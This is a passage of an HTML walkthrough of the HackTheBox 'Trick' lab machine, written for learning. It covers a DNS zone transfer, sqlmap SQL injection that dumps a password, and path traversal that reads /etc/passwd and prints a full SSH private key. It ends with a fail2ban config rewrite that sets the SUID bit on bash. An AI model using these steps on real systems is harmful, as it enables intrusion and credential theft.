<!DOCTYPE html>
<html>
<div id="particles-js">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!--  Essential META Tags -->
        <meta property="og:title" content="Trick HackTheBox Writeup">
        <meta name="description" content="Trick HackTheBox Writeup | 0xv01d">
        <meta property="og:type" content="article" />
        <meta property="og:image" content="/images/HTB/trick/trick_card.png">
        <!-- <meta property="og:url" content="https://0xv01d.github.io/hackthebox/trick"> -->
        <meta name="twitter:card" content="/images/HTB/trick/trick_card.png">

        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="/Scripts/js/particles.js"></script>
        <script src="/Scripts/js/app.js"></script>
        <title>Trick HTB Writeup</title>
        <meta property="og:locale" content="en_US">
        <script type="application/ld+json">
</script>

        <link rel="stylesheet" href="/Styles/style.css?v=">
        <link rel="stylesheet" href="/Styles/highlight_monokai.css">
        <!-- Setup Google Analytics -->

        <link rel="shortcut icon" type="image/x-icon" href="/images/HTB/trick/favicon.ico">

        <!--Information SideBar-->
        <header class="app-header">
            <a href="https:gaberoy01.github.io">
                <img class="avatar" src="/images/index/avatar.png">
            </a>
            <p></p>
            <h1><strong>Gabe's Writeups</strong></h1>
            <nav class="app-header-menu">
                <a class="app-header-menu-item" href="/">Home</a>
                -
                <a class="app-header-menu-item" href="#">Tags</a>
                -
                <a class="app-header-menu-item" href="#">About</a>
            </nav>
            <p>Bradley University Cybersecurity Club</p>
            <!--Contact me-->
            <div class="app-header-media">
                <a class="fab fa-github-square" href="https://github.com/GabeRoy01" rel="noreferrer noopener"
                    target="_blank"><img src="/images/index/github.png"></a>
                <<!-- a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener"
                    target="_blank"><img src="/images/index/email.png"></img></a> -->
                    <!-- <a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a> -->
                    <!-- <a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a> -->
            </div>
            <a href="https://app.hackthebox.com/profile/682451" rel="noreferrer noopener" target="_blank">
                <img src="http://www.hackthebox.eu/badge/image/682451" alt="Hack The Box">
            </a>
            <div style="height: 7rem;"></div>
        </header>

        <main class="app-container">


            <!--Machine Title-->
            <div class="title">Trick Walkthrough</div>
            <!--Skill Tags-->
            <div class="tag-skills">
                <svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round"
                    stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24"
                    xmlns="http://www.w3.org/2000/svg">
                    <title>tag</title>
                    <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
                    <line x1="7" x2="7.01" y1="7" y2="7"></line>
                </svg>
                <a class="tag" href="#">SQL-Injection</a>
                <a class="tag" href="#">AXFR</a>
                <a class="tag" href="#">Directory-Path-Traversal</a>
                <a class="tag" href="#">fail2ban</a>
            </div>

            </header>

            <!--Machine Card-->
            <div><img class="machine-card" style="max-width: 594px;" src="/images/HTB/trick/trick_card.png"></img></div>

            <!--Machine Overview
			<div class="subtitle">Trick Overview</div>
			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Trick" rel="noreferrer noopener" target="_blank">Trick</a> machine on HackTheBox, submitted by 
			<a href="https://app.hackthebox.com/users/184611" rel="noreferrer noopener" target="_blank">Geiseric</a>. The machine starts from a web server running nginx,
			eventually leading to <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/" rel="noreferrer noopener" target="_blank">Domain Zone Transfer attack via AXFR</a>, exposing a new domain vulnerable to <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>.
			From which configuration files can be enumerated which eventually lead to LFI and gain access via ssh, and finally abusing sudoers <a href="https://oklencodes.gitbook.io/untitled/ctfs/biteme-ctf/fail2ban-privilege-escalation" rel="noreferrer noopener" target="_blank">fail2ban</a> privileges.
        -->
            <!--Machine Resolution-->
            <h1 id="header-1">Recon</h1>

            <p>Let's start with a basic port scan</p>

            <div class="language-plaintext highlighter-rouge">
                <div class="highlight">
                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> nmap </span>-sC -sV 10.129.71.201
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 15:21 EDT
Nmap scan report for 10.129.71.201
Host is up (0.045s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span> </code></pre>
                </div>
            </div>

            <p class="head-img">We see a few open ports, so let's look around:</p>

            <img class="img-post" style="max-width: 900px;"
                src="/images/HTB/trick/Pasted image 20220715141524 1.png"></img>

            <p class="head-img">We see a pretty boring webpage with not too much to do, even grabbing the request of
                that one interaction in burp doesn't raise any flags (at least to my current level of understanding)</p>

            <p class="head-img">Seeing that port 53 hosts a DNS server, I want to try and use dig get some more details
                or nameservers to look into: </p>


            <div class="language-plaintext highlighter-rouge">
                <div class="highlight">
                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> dig </span> @10.10.11.166 -x 10.10.11.166
---SNIP---


;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 504e602135e7e4419ff56d1462fabe9b4b2b613c4ebc93f5 (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 32 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)

---SNIP---

</span> </code></pre>

                    <p class="head-img">Seeing that port 53 hosts a DNS server, I want to try and use dig get some more
                        details or nameservers to look into: </p>


                    <div class="language-plaintext highlighter-rouge">
                        <div class="highlight">
                            <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> dig </span> axfr trick.htb @10.10.11.166  
; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
<span class="k">preprod-payroll.trick.htb.</span> 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 36 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Aug 15 17:54:42 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)

</span> </code></pre>

                            <p class="head-img">Add the interesting domains to your */etc/hosts* file and give it
                                another look:</p>

                            <img class="img-post" style="max-width: 900px;"
                                src="/images/HTB/trick/preprod-sc.png"></img>

                            <p class="head-img">We can also use *FFuF* to enumerate other possible domains using a
                                wordlist and the format we got from the dig output:</p>

                            <div class="language-plaintext highlighter-rouge">
                                <div class="highlight">
                                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> ffuf </span> u http://trick.htb -w /usr/share/wordlists/subdomaint-top1million-5000.txt -H 'Host: preprod-FUZZ.trick.htb' -fw 1697  
v1.3.1 Kali Exclusive <3
________________________________________________
 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/subdomaint-top1million-5000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1697
________________________________________________
marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179]
:: Progress: [4989/4989] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:28] :: Errors: 0 ::

</span> </code></pre>

                                    <p class="head-img">While that runs (it could take a while to finish) we can go give
                                        a look to the preprod payroll site. We see a login page so it would be wise to
                                        see what the login looks like in Burp:</p>

                                    <img class="img-post" style="max-width: 900px;"
                                        src="/images/HTB/trick/burp1.png"></img>

                                    <p class="head-img">To summarize our method: even though we are capturing a POST
                                        request from when we manually submitted the credentials to the endpoint, we can
                                        see from the url that our login credentials are not actually being sent to that
                                        webpage. This could lead us to believe that our inputs aren't being sanitized
                                        before being sent to that backend server and we can inject some statements to
                                        obtain more information. </p>

                                    <p class="head-img">That being clarified (a little bit) we can copy our post request
                                        from burp into a text file and run it through sqlmap like this:</p>

                                    <div class="language-plaintext highlighter-rouge">
                                        <div class="highlight">
                                            <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login

---SNIP---

[18:14:56] [INFO] parsing HTTP request from 'trick-burp-login'
[18:14:57] [INFO] resuming back-end DBMS 'mysql' 
[18:14:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3148 FROM (SELECT(SLEEP(5)))ODNR) AND 'Ebkl'='Ebkl&password=test
---
[18:14:57] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[18:14:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'                             

[*] ending @ 18:14:57 /2022-08-15/

</span> </code></pre>


                                            <p class="head-img">This tells us that we can try some time-based SQLi. We
                                                want to try enumerating DBMS databases and use the default behavior for
                                                the sake of time. </p>

                                            <div class="language-plaintext highlighter-rouge">
                                                <div class="highlight">
                                                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login --dbs --batch

---SNIP---

[18:16:01] [INFO] fetching database names
[18:16:01] [INFO] fetching number of databases
[18:16:01] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[18:16:03] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[18:16:13] [INFO] retrieved: 
[18:16:19] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[18:17:21] [INFO] retrieved: payroll_db
available databases [2]:
[*] information_schema
[*] payroll_db

[18:18:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'                             

[*] ending @ 18:18:02 /2022-08-15/

</span> </code></pre>

                                                    <p class="head-img">We want to enumerate databases we have access to
                                                        so we use *--dbs* and we use *--batch* to indicate that we want
                                                        to use the default bahavior and not ask for user inputs. </p>
                                                    <p class="head-img">We see we can look at two databases:
                                                        information_schema and payroll_db so we want to try and look at
                                                        their tables. Here is what we get when we enumerate the second
                                                        one:</p>

                                                    <div class="language-plaintext highlighter-rouge">
                                                        <div class="highlight">
                                                            <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login --tables -D payroll_db --batch

---SNIP---

Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+

</span> </code></pre>

                                                            <p class="head-img">We use *--tables* to show the tables in
                                                                that database and *-D* to specify that we are
                                                                enumerating tables within a database.</p>

                                                            <p class="head-img">If we want a foothold, we will likely be
                                                                looking for poorly managed credentials in storage, logs,
                                                                programs, etc. This 'users' table would be a nice place
                                                                to look:</p>

                                                            <div class="language-plaintext highlighter-rouge">
                                                                <div class="highlight">
                                                                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login --columns -D payroll_db -T users --batch

---SNIP---

Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| name      | varchar(200) |
| password  | varchar(200) |
| type      | tinyint(1)   |
| username  | varchar(100) |
+-----------+--------------+

</span> </code></pre>

                                                                    <p class="head-img">We specify that we want to
                                                                        enumerate columns in the payroll_db database,
                                                                        specifically the users table. </p>
                                                                    <p class="head-img">We see username and password
                                                                        columns, hopefully if we find records at the
                                                                        intersect of these two columns those credentials
                                                                        will work somewhere.</p>

                                                                    <div class="language-plaintext highlighter-rouge">
                                                                        <div class="highlight">
                                                                            <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login --dump -D payroll_db -T users -C username,password --batch

---SNIP---

Database: payroll_db
Table: users
[1 entry]
+------------+-----------------------+
| username   | password              |
+------------+-----------------------+
| Enemigosss | SuperGucciRainbowCake |
+------------+-----------------------+

</span> </code></pre>


                                                                            <p class="head-img">Nice, we got a password
                                                                                and we can try to see where it works.
                                                                            </p>

                                                                            <img class="img-post"
                                                                                style="max-width: 900px;"
                                                                                src="/images/HTB/trick/adminlogin.png"></img>

                                                                            <p class="head-img">Trying those credentials
                                                                                on the website gives us access to an
                                                                                administrator account on the website we
                                                                                were looking into. </p>

                                                                            <p class="head-img">At this time we can go
                                                                                back to our FFuF scan and see the
                                                                                *marketing* directory is found, we can
                                                                                add this to our hosts file and take a
                                                                                look:</p>
                                                                            <img class="img-post"
                                                                                style="max-width: 900px;"
                                                                                src="/images/HTB/trick/prod-marketing.png"></img>

                                                                            <p class="head-img">When you navigate
                                                                                around, you'll see that the site is
                                                                                mostly a template with no real content
                                                                                but the index.php page has a parameter
                                                                                that allows you to look for a file name.
                                                                                We can try and read this php file to see
                                                                                how it reads and finds it's way to
                                                                                files:</p>

                                                                            <div
                                                                                class="language-plaintext highlighter-rouge">
                                                                                <div class="highlight">
                                                                                    <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> sqlmap </span> -r trick-burp-login --file-read "/var/www/market/index.php" --batch

---SNIP---

[02:27:20] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' and the remote file '/var/www/market/index.php' have the same size (194 B)                       
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php (same file)

</span> </code></pre>

                                                                                    <div
                                                                                        class="language-plaintext highlighter-rouge">
                                                                                        <div class="highlight">
                                                                                            <pre class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> cat </span> /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php

(PHP FILE)
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}

</span> </code></pre>

                                                                                            <p class="head-img">This
                                                                                                tells us that any '../'
                                                                                                instances will be
                                                                                                removed from the URL. We
                                                                                                can work around this by
                                                                                                appending a '..' to the
                                                                                                front, and a '/' to the
                                                                                                end like this:</p>

                                                                                            <div
                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                <div class="highlight">
                                                                                                    <pre
                                                                                                        class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> curl </span> -s "preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd" | grep bash

root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

</span> </code></pre>

                                                                                                    <p class="head-img">
                                                                                                        We can then try
                                                                                                        and get an SSH
                                                                                                        key for the user
                                                                                                        'michael'</p>

                                                                                                    <div
                                                                                                        class="language-plaintext highlighter-rouge">
                                                                                                        <div
                                                                                                            class="highlight">
                                                                                                            <pre
                                                                                                                class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> curl </span> "preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa"

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

</span> </code></pre>

                                                                                                            <p
                                                                                                                class="head-img">
                                                                                                                Same as
                                                                                                                always,
                                                                                                                save
                                                                                                                this
                                                                                                                file and
                                                                                                                set the
                                                                                                                privs to
                                                                                                                600 and
                                                                                                                ssh in:
                                                                                                            </p>

                                                                                                            <div
                                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                                <div
                                                                                                                    class="highlight">
                                                                                                                    <pre
                                                                                                                        class="highlight"><code>
<span class="na">$</span><span class="ld"><span class="kt"> ssh </span> michael@trick.htb -i id_rsa  

---SNIP---

michael@trick:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt


</span> </code></pre>


                                                                                                                    <p
                                                                                                                        class="head-img">
                                                                                                                        Now
                                                                                                                        that
                                                                                                                        we
                                                                                                                        have
                                                                                                                        a
                                                                                                                        user,
                                                                                                                        let's
                                                                                                                        enumerate
                                                                                                                        for
                                                                                                                        our
                                                                                                                        potential
                                                                                                                        privesc
                                                                                                                        routes:
                                                                                                                    </p>

                                                                                                                    <div
                                                                                                                        class="language-plaintext highlighter-rouge">
                                                                                                                        <div
                                                                                                                            class="highlight">
                                                                                                                            <pre
                                                                                                                                class="highlight"><code>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> sudo </span> -l

Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart


</span> </code></pre>

                                                                                                                            <p
                                                                                                                                class="head-img">
                                                                                                                                So,
                                                                                                                                we
                                                                                                                                can
                                                                                                                                restart
                                                                                                                                the
                                                                                                                                fail2ban
                                                                                                                                service
                                                                                                                                at
                                                                                                                                root's
                                                                                                                                level
                                                                                                                                of
                                                                                                                                privilege
                                                                                                                                with
                                                                                                                                no
                                                                                                                                password
                                                                                                                                needed.
                                                                                                                                What
                                                                                                                                is
                                                                                                                                fail2ban?
                                                                                                                                <a href="https://en.wikipedia.org/wiki/Fail2ban"
                                                                                                                                    rel="noreferrer noopener"
                                                                                                                                    target="_blank">Fail2Ban
                                                                                                                                    Wiki</a>
                                                                                                                            </p>

                                                                                                                            <p
                                                                                                                                class="head-img">
                                                                                                                                So
                                                                                                                                it
                                                                                                                                is
                                                                                                                                an
                                                                                                                                intrusion
                                                                                                                                detection
                                                                                                                                system
                                                                                                                                framework
                                                                                                                                that,
                                                                                                                                in
                                                                                                                                this
                                                                                                                                case,
                                                                                                                                appears
                                                                                                                                to
                                                                                                                                have
                                                                                                                                been
                                                                                                                                misconfigured
                                                                                                                                in
                                                                                                                                such
                                                                                                                                a
                                                                                                                                fashion
                                                                                                                                that
                                                                                                                                we
                                                                                                                                can
                                                                                                                                restart
                                                                                                                                the
                                                                                                                                service
                                                                                                                                entirely.
                                                                                                                                Here
                                                                                                                                is
                                                                                                                                an
                                                                                                                                exploit
                                                                                                                                strategy
                                                                                                                                with
                                                                                                                                some
                                                                                                                                handy
                                                                                                                                step-by-step
                                                                                                                                tasks:
                                                                                                                                <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7"
                                                                                                                                    rel="noreferrer noopener"
                                                                                                                                    target="_blank">Abusing
                                                                                                                                    Fail2Ban
                                                                                                                                    Misconfiguration
                                                                                                                                    to
                                                                                                                                    Escalate
                                                                                                                                    Privileges
                                                                                                                                    on
                                                                                                                                    Linux</a>
                                                                                                                            </p>

                                                                                                                            <div
                                                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                                                <div
                                                                                                                                    class="highlight">
                                                                                                                                    <pre
                                                                                                                                        class="highlight"><code>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> ls </span> -lsa /etc/fail2ban

4 drwxr-xr-x   6 root root      4096 Aug 19 08:51 .
12 drwxr-xr-x 126 root root     12288 Aug 19 06:27 ..
 4 drwxrwx---   2 root security  4096 Aug 19 08:51 action.d
 4 -rw-r--r--   1 root root      2334 Aug 19 08:51 fail2ban.conf
 4 drwxr-xr-x   2 root root      4096 Aug 19 08:51 fail2ban.d
 4 drwxr-xr-x   3 root root      4096 Aug 19 08:51 filter.d
24 -rw-r--r--   1 root root     22908 Aug 19 08:51 jail.conf
 4 drwxr-xr-x   2 root root      4096 Aug 19 08:51 jail.d
 4 -rw-r--r--   1 root root       645 Aug 19 08:51 paths-arch.conf
 4 -rw-r--r--   1 root root      2827 Aug 19 08:51 paths-common.conf
 4 -rw-r--r--   1 root root       573 Aug 19 08:51 paths-debian.conf
 4 -rw-r--r--   1 root root       738 Aug 19 08:51 paths-opensuse.conf
</span>

<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> ps </span> -ef | grep root | grep fail2ban
root        729      1  0 06:27 ?        00:00:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
</span>

</code></pre>

                                                                                                                                    <p
                                                                                                                                        class="head-img">
                                                                                                                                        Following
                                                                                                                                        the
                                                                                                                                        tutorial
                                                                                                                                        to
                                                                                                                                        this
                                                                                                                                        point
                                                                                                                                        gives
                                                                                                                                        you
                                                                                                                                        the
                                                                                                                                        option
                                                                                                                                        between
                                                                                                                                        the
                                                                                                                                        jail.conf
                                                                                                                                        file
                                                                                                                                        or
                                                                                                                                        the
                                                                                                                                        iptables-multiport.conf
                                                                                                                                        file.
                                                                                                                                        I
                                                                                                                                        chose
                                                                                                                                        iptables
                                                                                                                                        because
                                                                                                                                        it
                                                                                                                                        was
                                                                                                                                        shorter:
                                                                                                                                    </p>

                                                                                                                                    <div
                                                                                                                                        class="language-plaintext highlighter-rouge">
                                                                                                                                        <div
                                                                                                                                            class="highlight">
                                                                                                                                            <pre
                                                                                                                                                class="highlight"><code>
<span class="na">michael@trick:/etc/fail2ban/action.d~$</span><span class="ld"><span class="kt"> cat </span> iptables-multiport.conf

# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]


</span> </code></pre>

                                                                                                                                            <p
                                                                                                                                                class="head-img">
                                                                                                                                                We
                                                                                                                                                are
                                                                                                                                                going
                                                                                                                                                to
                                                                                                                                                make
                                                                                                                                                a
                                                                                                                                                copy
                                                                                                                                                of
                                                                                                                                                the
                                                                                                                                                file
                                                                                                                                                in
                                                                                                                                                our
                                                                                                                                                current
                                                                                                                                                working
                                                                                                                                                directory
                                                                                                                                                using
                                                                                                                                                the
                                                                                                                                                *sed*
                                                                                                                                                command
                                                                                                                                                that
                                                                                                                                                will
                                                                                                                                                make
                                                                                                                                                the
                                                                                                                                                bash
                                                                                                                                                program
                                                                                                                                                run
                                                                                                                                                as
                                                                                                                                                a
                                                                                                                                                SUID
                                                                                                                                                program
                                                                                                                                                at
                                                                                                                                                the
                                                                                                                                                privilege
                                                                                                                                                level
                                                                                                                                                of
                                                                                                                                                root.
                                                                                                                                                This
                                                                                                                                                way
                                                                                                                                                when
                                                                                                                                                we
                                                                                                                                                trigger
                                                                                                                                                the
                                                                                                                                                fail2ban
                                                                                                                                                service
                                                                                                                                                it
                                                                                                                                                will
                                                                                                                                                upgrade
                                                                                                                                                our
                                                                                                                                                shell
                                                                                                                                                to
                                                                                                                                                root
                                                                                                                                                privs.
                                                                                                                                            </p>

                                                                                                                                            <div
                                                                                                                                                class="language-plaintext highlighter-rouge">
                                                                                                                                                <div
                                                                                                                                                    class="highlight">
                                                                                                                                                    <pre
                                                                                                                                                        class="highlight"><code>
<span class="na">michael@trick:~$</span><span class="ld"><span class="kt"> sed </span>

"s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf &gt; config.conf


</span> </code></pre>

                                                                                                                                                    <p
                                                                                                                                                        class="head-img">
                                                                                                                                                        Then
                                                                                                                                                        we
                                                                                                                                                        can
                                                                                                                                                        remove
                                                                                                                                                        the
                                                                                                                                                        old
                                                                                                                                                        config
                                                                                                                                                        and
                                                                                                                                                        move
                                                                                                                                                        our
                                                                                                                                                        modified
